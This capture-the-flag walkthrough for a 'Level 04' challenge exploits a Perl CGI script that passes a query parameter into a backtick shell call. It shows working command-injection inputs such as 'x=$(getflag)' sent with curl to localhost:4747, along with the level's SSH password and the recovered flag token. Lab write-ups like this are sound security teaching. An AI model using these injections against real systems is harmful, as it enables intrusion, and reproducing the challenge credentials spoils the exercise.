# Level 04

## Requirements

- None

## Walkthrough

1. Login from the __attacker__'s machine.

	```
	ssh -p 4242 level04@192.168.1.32
	Password: qi0maab88jeaj46qoumi7maus
	```

1. Checking files.

	```sh
	> pwd
	/home/user/level04

	> ls -lth
	-rwsr-sr-x  1 flag04  level04  152 Mar  5  2016 level04.pl
	```

1. Good, we already have our entry point right here.

	```sh
	> ./level04.pl
	Content-type: text/html

	> cat level04.pl
	#!/usr/bin/perl
	# localhost:4747
	use CGI qw{param};
	print "Content-type: text/html\n\n";
	sub x {
	$y = $_[0];
	print `echo $y 2>&1`;
	}
	x(param("x"));
	```

1. Well... I do not know anything about PERL, but I know some about WebDev, so let's try to understand what it does, and then apply our new knowledge to test few things.

	```perl
	#!/usr/bin/perl
	# localhost:4747

	# From PERL documentation: CGI - Handle Common Gateway Interface requests and responses.
	use CGI qw{param};

	# Just a simple `print`, maybe to give a hint on what's going on
	# In combination with the `CGI`, it totally looks like a WebServer.
	print "Content-type: text/html\n\n";

	# Looks like a `function` called `x`
	sub x
	{
		# From PERL documentation: $_ - The default input and pattern-searching space
		# So `$_[0]` looks like it takes the first argument.
		$y = $_[0];

		# A `print` call using previous variable
		# Worth to mention, the use of `backticks` means everything between will be interpreted, so `stderr` is redirected to `stdout`, and we might be able to inject a command into `$y` a.k.a. `$_[0]`.
		print `echo $y 2>&1`;
	}

	# Looks like a `function call` with argument `param("x")`
	# Since we seems to run a WebServer, `param("x")` should be an URL query parameter.
	# ex: 42.fr/search?x=qwe
	x(param("x"));
	```

1. After a quick overview, let's try our first thought.

	```sh
	> ./level04.pl 42.fr/search?x=qwe
	Content-type: text/html

	qwe
	```

1. Amazing, we got our `param` back. Now, let's try to inject a command.

	```sh
	# After few test, just providing 'x=' seems to be enough to work.
	> ./level04.pl x=ls
	Content-type: text/html

	ls

	# The command has not been executed since there is a call to 'echo' ahead.
	# We need to run it as a subcommand.
	> ./level04.pl 'x=$(ls)'
	Content-type: text/html

	level04.pl

	# Gorgeous, our command is executed, let's get our flag!
	> ./level04.pl 'x=$(getflag)'
	Content-type: text/html

	Check flag.Here is your token : Nope there is no token here for you sorry. Try again :)

	# F-WORD! Something isn't working as expected.
	# Wait a minute... We were running the script as `level04` user, but on top of the script, a Host and a Port are provided. What about using them to make the server run the command ?
	```

1. Get the flag.

	```sh
	> curl 'localhost:4747?x=$(getflag)'
	Check flag.Here is your token : ne2searoevaevoem4ov4ar8ap
	```
## Documentation

- Language: [PERL](https://perldoc.perl.org/)
- Command: [Curl](https://man7.org/linux/man-pages/man1/curl.1.html)
